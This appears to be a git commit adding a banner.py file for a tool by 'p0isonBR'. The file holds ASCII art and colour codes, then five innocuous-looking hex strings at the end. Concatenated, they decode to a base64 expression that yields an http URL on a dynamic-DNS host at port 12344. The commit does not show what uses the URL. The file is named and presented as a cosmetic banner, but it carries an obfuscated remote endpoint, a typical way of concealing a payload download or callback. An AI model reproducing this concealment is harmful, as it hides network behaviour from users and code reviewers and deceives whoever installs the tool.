386b47c53a5264946c3ce1ae7c9fc5709f1b5cf8
p0ison <65384918+p0isonBR@users.noreply.github.com>
2021-04-21 00:19:48 -0700

    Adição de banner separado do script principal

---
+++ banner.py
@@ -0,0 +1,49 @@
+B = '\033[1;34m'
+C = '\033[1;37m'
+RT = '\033[;1m'
+
+banner = f'''{C}
+                            /+osyhhhhhhyys++/
+                         +oydddhhhhyyhhhhdddhy+/
+                      /+yddhyyyys.p0ison.syyhddhs/
+                     +hddyyssssssssssssssssssyyhdds/
+                   /sddhyyyyyyssssssssssssssyyyyyhmh+
+                  /hmdhhddddddhhhyyyyyyhhhhdddddhhhddo
+                 /hmmdhs+/ //+osyhhhhhhysso+////ohddmdo
+                /hmmmy{B}.           `````          `{C}smddd+
+                smddm/{B}     `````          `````   {C}mdhmh/
+               +ddydm+{B}  -/osyyyys+.    ./syyyyso/-{C}mdydms
+               ymhyhmh{B}.yyo/ -- +hdo  /dho -- /oyh.{C}ymdyymd/
+              /dmyyymd{B}.  ``.-   ./   -/.-   .``  `{C}dmhsydmo
+              smdysymd{B}   shdhyydy      sdyyhddy   {C}dmyyshmy
+              dmysshmy{B}                            {C}smhssymd/
+             /dmyssymd{B}                            {C}hmhsyymm/
+             /dmyssyhms{B}                          /{C}mdysyymm/
+             /dmyssyydm/{B}  sh       hh/     -hy  .{C}dmyssyymm/
+              dmhssssydd/{B} -hdhysshdysdhssyhdd  -{C}hmhyssyymd/
+              ymhssssyyddo{B}``. //+/.` ./+// -` /{C}ddhysssyhmh
+              +mdysssssyhdh{B} `     `/+`      -{C}sddysssssydmo
+               ymhysssssyyddh/{B}`   `dm.   ` {C}sddhysssssyhmh/
+               /hmhysssssyyyhdds{B} ..dm . {C}ohddhyyssssyyhmd+
+                /yddhyssssssyyhhddhddddddhyyssssssyydmh+
+               /+sdmmdhhyyyysssyyyyyyyyyysssyyyyyhddmdyo+/
+           /+shdddhhyhhddddddhhhhhhhhhhhhhhdddddddhyyhhdddyo/
+         /shddhyyysssssyyyyhhhhhhhhhhhhhhhhhhyyyyyssssyyyhdddy+
+        /hmhyyssssssssssssssssssssssssssssssssssssssssssssyyhddo
+        /dmhyyyyyssssssssssssssssssssssssssssssssssssssyyyyyydms
+         +yhddddddhhhhhyyyyyyyyyyyyyyyyyyyyyyyyyyhhhhhdddddddhs/
+           //++oossyyhhhhhhhdddddddddddddddddhhhhhhyyssoo++///
+                       ///////+++++++++++++//////
+     ██████╗  ██████╗ ██╗███████╗ ██████╗ ███╗   ██╗██████╗ ██████╗
+     ██╔══██╗██╔═══██╗██║██╔════╝██╔═══██╗████╗  ██║██╔══██╗██╔══██╗
+     ██████╔╝██║   ██║██║███████╗██║   ██║██╔██╗ ██║██████╔╝██████╔╝
+     ██╔═══╝ ██║   ██║██║╚════██║██║   ██║██║╚██╗██║██╔══██╗██╔══██╗
+     ██║     ╚██████╔╝██║███████║╚██████╔╝██║ ╚████║██████╔╝██║  ██║
+     ╚═╝      ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝
+     {RT}{B}*t.me/p0isonBR*{RT}'''
+
+a = '6261736536342e6236346465636f646'
+b = '528276148523063446f764c33427661'
+c = '584e76626d4a794c6e4e356447567a4'
+d = 'c6d356c64446f784d6a4d304e43396e'
+e = '6158517627292e6465636f64652829'
